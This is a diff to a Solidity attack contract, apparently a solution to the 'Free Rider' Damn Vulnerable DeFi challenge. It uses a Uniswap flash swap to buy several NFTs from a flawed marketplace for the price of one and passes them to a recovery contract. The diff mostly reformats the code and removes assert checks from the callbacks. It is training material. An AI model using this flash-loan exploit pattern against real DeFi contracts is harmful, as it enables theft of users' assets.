@@ -28,26 +28,39 @@ contract FreeRiderAttacker is IERC721Receiver {
         recovery = FreeRiderRecovery(_recovery);
         uniswapPair = IUniswapV2Pair(_uniswapPair);
         nft = marketplace.token();
-        weth = WETH(payable(uniswapPair.token0()));
-        token = DamnValuableToken(uniswapPair.token1());
+        weth = WETH(payable(
+            uniswapPair.token0()
+        ));
+        token = DamnValuableToken(
+            uniswapPair.token1()
+        );
     }
 
     function attack(uint[] calldata ids) public {
-        uniswapPair.swap(NFT_PRICE, 0, address(this), abi.encode(ids)); // NFT_PRICE wei flash loan from Uniswap in WETH
+        uniswapPair.swap(
+            NFT_PRICE, 
+            0, 
+            address(this), 
+            abi.encode(ids)
+        ); // NFT_PRICE wei flash loan from Uniswap in WETH
     }
 
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
 
-        assert(msg.sender == address(uniswapPair));
-        assert(sender == address(this));
-        assert(amount0 == NFT_PRICE);
-        assert(amount1 == 0);
-
         weth.withdraw(NFT_PRICE); // convert WETH to ETH
-        marketplace.buyMany{value: NFT_PRICE}(abi.decode(data, (uint[]))); // buy NFTs, here the magic happens
+        marketplace.buyMany{value: NFT_PRICE}(
+            abi.decode(
+                data, (uint[])
+            )
+        ); // buy NFTs, here the magic happens
 
         for (uint id=0; id < AMOUNT_OF_NFTS; id++) {
-            nft.safeTransferFrom(address(this), address(recovery), id, abi.encode(address(this))); // get NFTs to the recovery contract
+            nft.safeTransferFrom(
+                address(this), 
+                address(recovery), 
+                id, 
+                abi.encode(address(this))
+            ); // get NFTs to the recovery contract
         }
 
         weth.deposit{value: NFT_PRICE_WITH_FEE}(); // convert NFT_PRICE_WITH_FEE wei to WETH
@@ -63,11 +76,6 @@ contract FreeRiderAttacker is IERC721Receiver {
         uint256 tokenId,
         bytes calldata data
     ) external view override returns (bytes4) {
-        assert(operator == address(marketplace));
-        assert(from == deployer);
-        assert(data.length == 0);
-        assert(tokenId >= 0);
-        assert(tokenId < AMOUNT_OF_NFTS);
         return IERC721Receiver.onERC721Received.selector;
     }
 
